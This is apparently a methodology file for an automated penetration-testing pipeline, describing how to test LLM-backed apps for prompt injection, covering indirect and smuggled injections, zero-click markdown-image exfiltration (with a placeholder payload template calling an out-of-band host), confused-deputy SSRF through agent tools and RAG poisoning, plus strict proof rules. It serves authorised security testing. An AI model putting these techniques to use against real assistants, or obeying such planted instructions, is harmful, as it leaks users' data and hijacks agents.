---
name: llm_prompt_injection
description: LLM prompt injection (direct/indirect), zero-click markdown-image & tool-use exfil, RAG corpus poisoning, confused-deputy agentic SSRF — provable only via OAST or a verifiable cross-tenant artifact
applicable_contexts: [web, api, llm]
---

## LLM Prompt Injection Testing Methodology

> Injection alone is **Informational/SUSPECTED**. A model *saying* something, *refusing*,
> or *complying* with role-play is not a finding — confabulation is the dominant false
> positive. A finding exists only when the injection crosses a trust boundary you can
> **prove**: an OAST callback, or an independently verifiable cross-tenant artifact.
> ARGUS itself routes analysis through WhiteRabbitNeo, so target-supplied content (findings,
> page text, docs) is an indirect-injection channel into our own pipeline — keep every
> canary inert.

### Discovery Phase

Signals / entry points that mark an LLM-backed sink:

- Any endpoint whose response is model-generated: chatbots, "summarize this URL/upload",
  autocomplete, AI code-review, support-triage, agentic copilots, MCP-backed tools.
- Doc/image upload that triggers AI processing (PDF/DOCX/screenshot summarization).
- A "sources" / "similar documents" / "retrieved context" block in a response => RAG.
- Directly reachable vector-DB ports (Chroma, Weaviate, Qdrant, Milvus, pgvector) on
  `{target_host}:{target_port}`.
- Backend fingerprint headers leak the provider/model even when extraction fails
  (`x-*-model`, `x-*-region`, deployment headers) — record for CVE correlation, not as a finding.

Trust-boundary map (score each injection by the **sink** it reaches, never by the text):

| Channel | Class | Attacker controls |
|---|---|---|
| Chat box | Direct injection | The prompt (raw concat / chat-ML roles / JSON context-break) |
| Uploaded doc, fetched web page, email/ticket/PR the agent reads | Indirect injection | Data the *victim's* model later ingests |
| Low-contrast/EXIF text in an uploaded image (vision model) | Multimodal indirect | Tokenized-but-human-invisible instruction |
| Unicode Tags-block (U+E0000–U+E007F) / zero-width / bidi carriers | ASCII smuggling | Bypasses human + keyword review only |
| RAG-indexed document | Corpus poisoning | Persistent payload reaching later users |
| Agent `fetch`/`browse`/`http`/code tool | Confused-deputy | An SSRF/RCE primitive with elevated network position + context secrets |

### Exploitation Phase

Reference the payload **families** conceptually — no working exploit code, placeholders only
(`{param} {canary} {oast_host} {target_url} {attacker_origin} {target_email}`):

- **Direct-injection family** — context-break framings (instruction-override, fake
  system-turn, JSON role injection). Test all framings; note which the stack fails to escape.
- **Indirect-injection carrier family** — hidden instruction in a doc/page/email/ticket that
  tells the model to call out to `https://{canary}.{oast_host}/…?d={param}` and stay silent.
  Delivered via upload, "summarize this URL", or any ingested channel.
- **Smuggling-carrier family** — same instruction hidden in Tags-block / zero-width /
  homoglyph carriers so a human reviewer and keyword filter do not see it. Smuggling only buys
  review-bypass; the proof bar is unchanged.
- **Zero-click markdown-image exfil family** — if model output renders as markdown/HTML, an
  injected image reference `![x](https://{canary}.{oast_host}/p?d={param})` fires a GET with
  no click; steer `{param}` to context the model should not expose (e.g. `{target_email}`,
  tokens), URL-encoded.
- **Confused-deputy tool-use family** — instruct an agent's fetch/browse tool to retrieve
  `https://{canary}.{oast_host}/…` (exfil) and chain to internal/metadata targets per the
  `ssrf` skill (elevated network position). A code/shell tool run that echoes an inert
  `{canary}` marker demonstrates RCE.
- **RAG corpus-poisoning family** — plant a payload in filler text about a common topic so it
  retrieves broadly; the proof is a *different clean session* inheriting it on an unrelated query.
- **Cross-tenant / IDOR-via-AI family** — ask the tool/retrieval layer for another tenant's
  object by id/namespace; the bug is missing per-tenant scoping on the data layer, not the prompt.

Per-session unique `{canary}` subdomains so the callback names which sink fired.

### Confirmation Phase

Align every claim to the ARGUS arbiter (`src/pipeline/contracts/confirmation_rules.py`).
Seed confidence (`suspected|likely|confirmed`) rates the **seed as a hint only** — it describes
how promising the payload is, never the provenness of a finding, and it MUST NEVER raise a
finding's EvidenceTier.

**(a) What does NOT constitute confirmation for this class:**

- A rendered markdown image, or a 200 from the app, is **not** a controlled OAST interaction —
  the GET must actually land in *your* listener (parallels the SSRF rule).
- The model reflecting/echoing a string, or complying with "pretend you're admin", is **not**
  execution or a leak — reflection/compliance is theatre (parallels the XSS rule).
- A confabulated "system prompt" or "other user's data" proves nothing — the model invents
  plausible text. Non-reproducible or unverifiable output is discarded.
- A refusal is server *policy*, not server *state*; absence of a refusal is not a bypass.

**(b) Negative control (the baseline that must differ) —** written to `negative_control_result`:

- Exfil / confused-deputy: the **benign baseline** (identical prompt with the injected
  instruction removed) must produce **no** callback to `{canary}.{oast_host}`.
- Cross-tenant: a **control query on your own account A** must return only A's data; the attack
  run must return the verifiable account-B artifact.
- System-prompt leak: **two fresh sessions** (cleared state) are the control pair — a real leak
  reproduces token-for-token; divergent wording = confabulation.
- Corpus poisoning: a **second, independent clean session** asking an unrelated-but-on-topic
  query — not a re-ask by the uploading session.

**(c) Impact proof — exactly one EvidenceKind per variant:**

| Variant | Impact proof | EvidenceKind |
|---|---|---|
| Markdown-image / tool-use / DNS-only exfil; SSRF-to-metadata chain | Callback to unique `{canary}.{oast_host}` carrying the real `{param}` data (DNS+HTTP) | **OAST_CALLBACK** |
| Cross-tenant IDOR-via-AI / RAG cross-tenant read | Request/response carrying an independently verifiable account-B artifact | **HAR** |
| Persistent RAG poisoning reaching a clean session | Clean-session transcript containing the planted non-guessable `{canary}` verbatim | **RAW_OUTPUT** |
| System-prompt / config / tool-scope leak | Two token-for-token identical runs exposing a non-guessable anchor (secret/internal URL/tool scope) | **RAW_OUTPUT** |
| AI code-review/completion sabotage | The emitted insecure artifact | **DIFF** |

**(d) Repeats for stability:** reproduce **>=2** times in fresh sessions. Leak variants must
match **verbatim** across both runs (run-twice rule); exfil variants must land the callback on
each repeat and never on the negative-control run.

**OAST gate (this class is OAST-dependent):** for the exfil and confused-deputy-SSRF variants,
**without a confirmed OAST_CALLBACK the finding is capped at SUSPECTED**, regardless of how
convincing the model output looks. The only non-OAST confirmation path is the cross-tenant
variant proven by a verifiable artifact in HAR.

### Validation Requirements

**Minimum for CONFIRMED** (one of):

- OAST_CALLBACK to the unique `{canary}` carrying the exfiltrated data, **plus** the
  `negative_control_result` baseline that produced no callback, repeated >=2; or
- HAR showing a cross-tenant artifact independently tied to account B, **plus** the
  own-account control query; or
- RAW_OUTPUT from an independent clean session containing the planted non-guessable `{canary}`
  (poisoning), or two verbatim-identical runs exposing a non-guessable anchor (system-prompt leak).

Producer note: populate `oast_callback` + `canary` (exfil/SSRF path) or
`cross_owner_access` + `negative_control_result` (cross-tenant path). The class has **no**
`_CLASS_RULES` entry yet, so a future `_rule_llm_prompt_injection` (OAST **or** cross-tenant,
shaped like `_rule_ssrf` OR `_rule_idor`) will adjudicate on exactly these keys.

**Raises to EXPLOITED** when realized impact is demonstrated:

- A leaked credential/token is replayed to perform an action only the victim identity could; or
- The confused-deputy fetch returns live cloud-metadata credentials (OAST_CALLBACK carrying the
  IMDS/metadata response — chain into the `ssrf` skill); or
- A code/shell tool returns controlled `{canary}` output (RCE — chain into the `rce` skill); or
- Cross-tenant PII is retrieved at scale via enumeration, each record verifiable.

### Related Skills & Chains

- `ssrf` — any agent fetch/browse tool is an SSRF primitive with an elevated network position;
  OAST-confirm both the exfil leg and the metadata leg.
- `idor` — chatbots/RAG without per-tenant scoping are IDOR at the data layer; same
  verifiable-artifact bar.
- `xss` — markdown/HTML rendering of model output is an XSS/exfil vehicle; confirm in a browser
  context, not by reflection.
- `rce` — code-interpreter/shell tools are RCE-by-design when escape is possible; prove with an
  inert `{canary}` marker in output.
